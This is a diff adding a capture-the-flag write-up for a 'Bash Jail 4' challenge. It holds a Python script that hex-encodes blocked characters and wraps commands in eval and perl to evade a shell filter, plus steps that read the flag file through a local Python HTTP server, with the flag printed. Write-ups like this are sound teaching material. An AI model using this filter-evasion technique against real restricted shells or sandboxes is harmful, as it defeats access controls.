@@ -1,0 +1,55 @@
+Bash Jail 4
+---------------------------------------------------
+
+This one was a real meany, since all useful directories and applications (wget, curl, etc.) were removed from the server.
+
+It was quite simple to avoid the filtering mechanism by using eval and perl. 
+
+I wrote a short script to make it easier to try out some commands without having to fiddle with the filtering all the time.
+
+############################################################################################################
+#!/usr/bin/python
+import sys
+
+cmd = sys.argv[1]
+
+print "Transforming command: %s" % cmd
+
+result = ""
+
+disallowed = ['b','d','k','s','c','>','<','&','$','.','/','\'','"',' ','@']
+
+for ch in cmd:
+	if ch in disallowed:
+		result += "\\\\x" + str(ch).encode('hex')
+	else:
+		result += ch
+
+print "eval `({perl,-e,'print \"%s\"'})`" % result
+###########################################################################################################
+
+My first plan was to post the flag through wget to a listening server, which worked really well on my local machine ;)
+
+Then I realized that we don't have netcat, wget, curl or anything else useful on the jail server :(
+
+Well at least python is there to help:
+
+So, let's connect to the jail server, and start a HTTP-Server with python
+
+python -m SimpleHTTPServer 8001
+
+Then connect to the jail1-server in another terminal, open bash and fire up python with
+
+python >&2
+
+level1@lxc17-bash-jail:~$ python >&2
+Python 2.7.6 (default, Jun 22 2015, 17:58:13) 
+[GCC 4.8.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import urllib2
+>>> urllib2.urlopen("http://localhost:8001/flag.txt").read()
+'FLAG-OTQKB0274fwtxk3v2rTLCd0l5v7KNp7F\n'
+
+In the end there wasn't the need for bypassing the filter, but well :)
+
+
